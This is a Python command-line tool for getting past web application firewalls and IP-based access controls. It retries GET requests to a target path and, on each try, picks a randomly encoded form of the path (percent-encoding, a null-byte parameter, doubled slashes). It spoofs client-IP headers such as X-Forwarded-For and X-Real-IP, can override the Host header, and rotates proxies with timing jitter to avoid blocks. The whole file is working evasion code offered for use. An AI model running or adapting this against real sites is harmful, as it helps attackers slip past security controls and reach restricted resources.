#!/usr/bin/env python3
import random, argparse
import stealth

ENC = [
    lambda p: p,
    lambda p: p.replace(" ", "%20"),
    lambda p: "".join(f"%{ord(c):02x}" if c in ".'\"<>/" else c for c in p),
    lambda p: p + ("&" if "?" in p else "?") + "_=%00",
    lambda p: p.replace("/", "//"),
]

def send(url, path, via=None, host=None, tries=6):
    for i in range(tries):
        target = url.rstrip("/") + random.choice(ENC)(path)
        client, proxy = stealth.make_client(http2=(via is None))
        h = {
            "X-Forwarded-For": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "X-Originating-IP": f"{random.randint(1,223)}.{random.randint(0,255)}.0.1",
            "X-Real-IP": f"127.0.0.{random.randint(1,254)}",
        }
        if host: h["Host"] = host
        try:
            r = client.get(target, headers=h)
        except Exception as e:
            print(f"[{i}] transport: {e} (proxy={proxy})"); stealth.jitter(); continue
        finally:
            client.close()
        print(f"[{i}] {'OK ' if r.status_code<400 else 'BLK'} {r.status_code} len={len(r.content)} proxy={proxy or 'direct'}")
        if r.status_code < 400 and r.content:
            return r
        stealth.jitter()
    return None

if __name__ == "__main__":
    ap = argparse.ArgumentParser(); ap.add_argument("url"); ap.add_argument("--path", default="/")
    ap.add_argument("--via"); ap.add_argument("--host"); a = ap.parse_args()
    r = send(a.url, a.path, a.via, a.host)
    print("\n[+] body head:\n", r.text[:600]) if r is not None else print("\n[-] all blocked")
